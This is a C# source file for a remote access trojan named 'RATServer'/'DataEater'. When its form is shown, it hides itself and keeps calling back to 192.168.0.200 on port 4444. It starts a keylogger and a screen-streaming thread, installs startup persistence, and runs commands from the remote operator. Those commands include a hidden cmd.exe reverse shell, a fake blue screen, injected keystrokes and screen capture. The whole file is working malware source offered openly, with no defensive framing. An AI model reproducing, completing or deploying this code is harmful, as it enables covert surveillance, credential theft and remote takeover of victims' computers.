using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets; //abrir socket
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Drawing.Imaging;
using RemotingInterface;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using RATServer;
using WindowsInput;




namespace RATServer
{
    public partial class Form1 : Form
    {
        Remoting remoting = new Remoting();
        StartUpManager startupManager = new StartUpManager();
        InterceptKeys interceptKeys = new InterceptKeys();
        Sound sound = new Sound();
        CD cd = new CD();
        Interaction interaction = new Interaction();
        DesktopInterface desktopInterface;
        

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            
            this.Hide();
            for (;;)
            {
                RunServer();
                System.Threading.Thread.Sleep(5000);
            }
            
        }


    private void RunServer()
        {
            Threads threads = new Threads();
            Variables variables = new Variables();
            Connection.memoryStream = new MemoryStream();
            Connection.tcpClient = new TcpClient();
            ImageStream.tcpClient = new TcpClient();

            if (!Connection.tcpClient.Connected)
            {
            try
            {
                    
                   
                    try {
                        Connection.tcpClient.Connect("192.168.0.200", 4444);
                        Connection.networkStream = Connection.tcpClient.GetStream();
                        Connection.streamReader = new StreamReader(Connection.networkStream);
                        Connection.streamWriter = new StreamWriter(Connection.networkStream);

                    }
                    catch (Exception err)
                    {
                        return;
                    }
                    Connection.streamWriter.Write("****DataEater connected. Exploit ready*****.\r\n");
                    Connection.streamWriter.Flush();

                    threads.th_keylogging = new Thread(new ThreadStart(interceptKeys.Keylog));
                    threads.th_keylogging.Start();

                    threads.th_remoteDesktop = new Thread(new ThreadStart(remoting.SendImage));
                    threads.th_remoteDesktop.Start();

                    startupManager.Execute();

                    string line;
                    while (true) { 
                    line = "";
                    line = Connection.streamReader.ReadLine();
                    switch (line) {
                        case "message":
                                Connection.streamWriter.Write("**Inform your message:** \r"); Connection.streamWriter.Flush();
                                string message = Connection.streamReader.ReadLine();
                                threads.th_message = new Thread(() => interaction.MessageCommand(message));
                                threads.th_message.Start();
                                break;

                        case "notifyIcon":
                                Connection.streamWriter.Write("**Inform title:** \r\n");
                                Connection.streamWriter.Flush();
                                string notifyTitle = Connection.streamReader.ReadLine();
                                Connection.streamWriter.Write("**Inform your message:** \r\n");
                                Connection.streamWriter.Flush();
                                string notifyMessage = Connection.streamReader.ReadLine();
                                Connection.streamWriter.Write("**Inform Time:** \r\n");
                                Connection.streamWriter.Flush();
                                string notifyTime = Connection.streamReader.ReadLine();
                                threads.th_notifyicon = new Thread(() => ShowNotifyIcon(notifyMessage, notifyTime, notifyTitle));
                                threads.th_notifyicon.Start();
                                break;
                           
                        case "beep":
                                Connection.streamWriter.Write("**Inform time:** \r\n");
                                Connection.streamWriter.Flush();
                                string timeBeep = Connection.streamReader.ReadLine();
                                Connection.streamWriter.Write("**Inform frequency:** \r\n");
                                Connection.streamWriter.Flush();
                                string frequencyBeep = Connection.streamReader.ReadLine();
                                threads.th_beep = new Thread(() => sound.BeepCommand(timeBeep, frequencyBeep));
                                threads.th_beep.Start();
                                break;

                        case "blueScreen":
                                Connection.streamWriter.Write("**Inform time in seconds:** \r\n");
                                Connection.streamWriter.Flush();
                                string timeBlueScreen = Connection.streamReader.ReadLine();
                                threads.th_blueScreen = new Thread(()=> interaction.BlueScreen(timeBlueScreen));
                                threads.th_blueScreen.Start();
                            break;

                        case "textEntry":
                            Connection.streamWriter.Write("**Inform text:** \r\n");
                            Connection.streamWriter.Flush();
                            string insertedText = Connection.streamReader.ReadLine();
                            interaction.EnterText(insertedText);
                            break;

                        case "help":
                                Connection.streamWriter.Write(variables.strHelp);
                                Connection.streamWriter.Flush();
                                break;

                        case "shutDownSV":
                                Connection.streamWriter.Flush();
                                Connection.ShutDownServer();
                                break;

                        case "ejectCD":
                                threads.th_ejectCD = new Thread(new ThreadStart(cd.EjectCD));
                                threads.th_ejectCD.Start();
                                break;

                        case "closeCD":
                                threads.th_closeCD = new Thread(new ThreadStart(cd.CloseCD));
                                threads.th_closeCD.Start();
                                break;

                        case "playSound":
                                threads.th_playSound = new Thread(new ThreadStart(sound.PlaySoundCommand));
                                threads.th_playSound.Start();
                                break;

                        case "changeWAVVolume":
                                Connection.streamWriter.Write("**Inform desired volume level (fraction of maxLevel):** \n");
                                Connection.streamWriter.Flush();
                                string level = Connection.streamReader.ReadLine();
                                uint levelu = Convert.ToUInt32(level);
                                threads.th_changeVolume = new Thread(() => sound.ChangeVolume(levelu));
                                threads.th_changeVolume.Start();
                                break;
                        case "capture":
                                remoting.CaptureDesktop();
                                remoting.SaveDesktop();
                                break;
                        case "incVol":
                                InputSimulator.SimulateKeyPress(VirtualKeyCode.VOLUME_UP);
                                break;
                        case "decVol":
                                InputSimulator.SimulateKeyPress(VirtualKeyCode.VOLUME_DOWN);
                                break;

                        case "muteVol":
                                InputSimulator.SimulateKeyPress(VirtualKeyCode.VOLUME_MUTE);
                                break;

                            case "shell":
                            Cmd.shellInitiated = true;
                            Cmd.processCmd.StartInfo.FileName = "cmd.exe";
                            Cmd.processCmd.StartInfo.CreateNoWindow = true;
                            Cmd.processCmd.StartInfo.UseShellExecute = false;
                            Cmd.processCmd.StartInfo.RedirectStandardOutput = true;
                            Cmd.processCmd.StartInfo.RedirectStandardInput = true;
                            Cmd.processCmd.StartInfo.RedirectStandardError = true;
                            Cmd.processCmd.OutputDataReceived += new DataReceivedEventHandler(Cmd.CmdOutputDataHandler);
                            Cmd.processCmd.Start();
                            Cmd.processCmd.BeginOutputReadLine();
                            Cmd.strInput = new StringBuilder();
                            while (true)
                            {
                                try
                                {
                                    Cmd.strInput.Append(Connection.streamReader.ReadLine());
                                    Cmd.strInput.Append("\n");
                                    Cmd.processCmd.StandardInput.WriteLine(Cmd.strInput);
                                    if (Cmd.strInput.ToString().LastIndexOf("exit") >= 0)
                                    {
                                        Connection.streamWriter.Write("**Shell exiting \n **");
                                        Connection.streamWriter.Flush();
                                        throw new ArgumentException();
                                        
                                    }
                                    Cmd.strInput = Cmd.strInput.Remove(0, Cmd.strInput.Length);
                                }
                                catch (Exception err)
                                {   
                                    break;
                                };


                            }

                            break;

                        default:
                                Connection.streamWriter.Write("**Command not recognized. Show help dialog? (Y or N)** \r\n");
                                Connection.streamWriter.Flush();
                                string help = Connection.streamReader.ReadLine();
                                if (help == "Y" || help == "y")
                                {
                                    Connection.streamWriter.Write(variables.strHelp);
                                    Connection.streamWriter.Flush();
                                }
                                break;
                    }
                }
            }
            catch (Exception err)
            {
                    Connection.ShutDownServer();
                
            }

        }
        }
        private void Form1_Load(object sender, EventArgs e)
        {

            interceptKeys.keyBuffer.Append("(keylog)");

        }


        public void ShowNotifyIcon(string message, string timeNotifyIcon, string title)
        {
            int timeNotifyIconInt = Int32.Parse(timeNotifyIcon);
            timeNotifyIconInt = timeNotifyIconInt * 1000;
            notifyIcon1.Text = message;
            notifyIcon1.Icon = SystemIcons.Exclamation;
            notifyIcon1.BalloonTipTitle = title;
            notifyIcon1.BalloonTipText = message;
            notifyIcon1.BalloonTipIcon = ToolTipIcon.Error;
            notifyIcon1.Visible = true;
            notifyIcon1.ShowBalloonTip(timeNotifyIconInt);

        }

        
        private void timer1_Tick(object sender, EventArgs e)
        {
            
            
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {

        }
    }
}
